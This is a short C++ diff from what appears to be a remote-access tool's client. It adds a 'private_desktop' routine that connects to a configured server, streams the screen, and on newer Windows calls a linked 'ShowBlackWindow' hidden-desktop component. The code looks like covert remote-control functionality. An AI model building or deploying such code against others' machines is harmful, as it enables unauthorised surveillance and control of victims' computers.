@@ -46,6 +46,36 @@ template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
 	return 0;
 }
 
+#ifdef _WIN64
+#ifdef _DEBUG
+#pragma comment(lib, "PrivateDesktop_Libx64d.lib")
+#else
+#pragma comment(lib, "PrivateDesktop_Libx64.lib")
+#endif
+void ShowBlackWindow(IOCPBase* ClientObject, CONNECT_ADDRESS* conn, const std::string& hash, const std::string& hmac);
+#else
+void ShowBlackWindow(IOCPBase* ClientObject, CONNECT_ADDRESS* conn, const std::string& hash, const std::string& hmac) {
+	return ClientObject->RunEventLoop(TRUE);
+}
+#endif
+
+DWORD private_desktop(CONNECT_ADDRESS* conn, const State &exit, const std::string& hash, const std::string& hmac) {
+	IOCPClient* ClientObject = new IOCPClient(exit, true, conn->iHeaderEnc);
+	if (ClientObject->ConnectServer(conn->ServerIP(), conn->ServerPort()))
+	{
+		CScreenManager	m(ClientObject, 32, (void*)1);
+		if (IsWindows8orHigher()) {
+			ShowBlackWindow(ClientObject, conn, hash, hmac);
+		}
+		else {
+			ClientObject->RunEventLoop(TRUE);
+		}
+	}
+	delete ClientObject;
+
+	return 0;
+}
+
 DWORD WINAPI LoopScreenManager(LPVOID lParam)
 {
 	return LoopManager<CScreenManager, 0>(lParam);
